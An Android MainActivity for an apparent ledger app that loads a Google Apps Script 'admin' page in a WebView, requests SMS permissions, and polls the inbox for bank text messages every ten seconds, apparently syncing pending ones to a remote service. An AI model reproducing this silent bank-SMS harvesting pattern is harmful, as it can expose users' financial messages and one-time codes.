package com.daftar.rooznameh;

import android.Manifest;
import android.app.Activity;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

public class MainActivity extends Activity {

    private static final int REQ_SMS = 1001;

    private static final String ADMIN_URL =
            "https://script.google.com/macros/s/AKfycbyLjGFEBZuoF2HxMYHvbJaTEjM8NXf4_6mEUGd4iKE0Fp1xZwIwl3XfY5EhepGlKj72/exec?page=admin";

    private WebView webView;
    private Handler syncHandler = new Handler();

    private Runnable syncRunnable = new Runnable() {
        @Override
        public void run() {
            SmsReceiver.scanInboxBankSms(MainActivity.this, 300);
            SmsReceiver.retryPendingSms(MainActivity.this);
            syncHandler.postDelayed(this, 10000);
        }
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        webView = new WebView(this);
        setContentView(webView);

        WebSettings settings = webView.getSettings();
        settings.setJavaScriptEnabled(true);
        settings.setDomStorageEnabled(true);
        settings.setDatabaseEnabled(true);
        settings.setLoadWithOverviewMode(true);
        settings.setUseWideViewPort(true);
        settings.setBuiltInZoomControls(false);
        settings.setDisplayZoomControls(false);

        webView.setWebViewClient(new WebViewClient());
        webView.loadUrl(ADMIN_URL);

        requestSmsPermission();

        SmsReceiver.scanInboxBankSms(this, 300);
        SmsReceiver.retryPendingSms(this);

        syncHandler.postDelayed(syncRunnable, 10000);
    }

    private void requestSmsPermission() {
        if (android.os.Build.VERSION.SDK_INT >= 23) {
            if (checkSelfPermission(Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED ||
                checkSelfPermission(Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {

                requestPermissions(
                        new String[]{
                                Manifest.permission.RECEIVE_SMS,
                                Manifest.permission.READ_SMS
                        },
                        REQ_SMS
                );
            }
        }
    }

    @Override
    public void onResume() {
        super.onResume();

        SmsReceiver.scanInboxBankSms(this, 300);
        SmsReceiver.retryPendingSms(this);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        syncHandler.removeCallbacks(syncRunnable);
    }

    @Override
    public void onBackPressed() {
        if (webView != null && webView.canGoBack()) {
            webView.goBack();
        } else {
            super.onBackPressed();
        }
    }
}
